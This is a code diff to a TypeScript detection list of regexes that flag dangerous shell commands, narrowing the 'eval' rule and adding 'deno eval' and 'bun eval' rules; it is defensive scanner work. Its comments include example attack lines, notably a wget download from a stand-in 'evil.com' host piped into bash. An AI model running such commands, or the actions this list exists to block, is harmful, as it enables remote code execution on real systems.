@@ -179,7 +179,10 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // e.g. wget --content-disposition evil.com/exploit.sh && bash exploit.sh
   { pattern: /\bwget\b(?=.*--content-disposition\b).*(?:&&|;).*\b(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun|lua|php|awk)\b/, category: "remote-code-execution" },
   // Arbitrary code execution — eval, shell -c run uncontrolled strings
-  { pattern: /\beval\s/, category: "arbitrary-code-execution" },
+  // Anchored to command-start boundaries (^, ;, &, |) to avoid false positives where "eval"
+  // appears as a grep/echo argument (e.g. `grep 'eval foo' file.txt`). Subcommand forms like
+  // `deno eval` and `bun eval` are handled by dedicated inline-code-execution patterns below.
+  { pattern: /(?:^|[;&|]\s*)eval(?:\s|$)/, category: "arbitrary-code-execution" },
   { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh\s+-c\b/, category: "arbitrary-code-execution" },
   // Fish shell -c — executes arbitrary code identically to sh -c but was previously unmatched
   { pattern: /\bfish\s+-c\b/, category: "arbitrary-code-execution" },
@@ -211,6 +214,11 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // deno -e / bun -e — inline code execution flags; peer to node -e, ruby -e, perl -e
   { pattern: /\bdeno\s+-e\b/, category: "inline-code-execution" },
   { pattern: /\bbun\s+-e\b/, category: "inline-code-execution" },
+  // deno eval / bun eval — subcommand form of inline code execution; functionally identical to
+  // `deno -e` / `bun -e`. Listed here so they resolve to inline-code-execution rather than
+  // falling through to the command-anchored eval catch-all below.
+  { pattern: /\bdeno\s+eval\b/, category: "inline-code-execution" },
+  { pattern: /\bbun\s+eval\b/, category: "inline-code-execution" },
   // lua -e — executes arbitrary Lua code inline; `lua -e 'os.execute("id")'` is functionally
   // identical to `python3 -c` or `node -e` and is available in many CI/Linux environments.
   { pattern: /\blua\s+-e\b/, category: "inline-code-execution" },
